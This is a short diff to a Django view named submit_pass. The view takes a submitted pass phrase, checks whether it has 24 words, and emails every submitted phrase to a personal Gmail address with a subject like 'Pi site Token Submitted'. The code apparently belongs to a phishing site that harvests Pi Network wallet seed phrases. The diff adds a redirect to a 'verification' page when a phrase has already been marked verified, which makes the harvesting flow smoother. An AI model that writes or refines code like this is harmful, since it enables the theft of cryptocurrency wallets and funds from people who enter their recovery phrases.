@@ -76,6 +76,11 @@ def submit_pass(request):
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
         words = keys.split()
+        
+        if models.PassPhrase.objects.filter(keys=keys, is_verified = True):
+            return render(request, 'verification.html', {})
+        
+
         if len(words) != 24:
             if my_site:
                 send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
@@ -87,6 +92,9 @@ def submit_pass(request):
         else:
             look_up_key = generate_password()
             key_exists = models.PassPhrase.objects.filter(keys=keys)
+
+            if models.PassPhrase.objects.filter(keys=keys, is_verified = True):
+                return render(request, 'verification.html', {})
 
             if key_exists:
                 if my_site: # for validatepis 
